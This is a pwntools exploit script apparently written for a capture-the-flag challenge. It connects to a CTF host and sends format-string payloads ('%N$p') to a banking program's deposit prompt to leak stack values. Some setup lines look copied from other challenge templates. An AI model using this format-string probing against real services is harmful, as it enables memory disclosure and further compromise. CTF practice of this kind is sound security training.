#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'tjc.tf', 31363

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'error'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    for i in range(35, 100):
        io.sendlineafter(b'What would you like to do? (view balance|deposit|withdraw|transfer|exit) ', b'deposit')
        io.sendlineafter(b'Enter amount: ', b'%%%d$p' % i)
        print(i, io.recvline().strip())
    io.interactive()

if __name__ == '__main__':
    exploit()
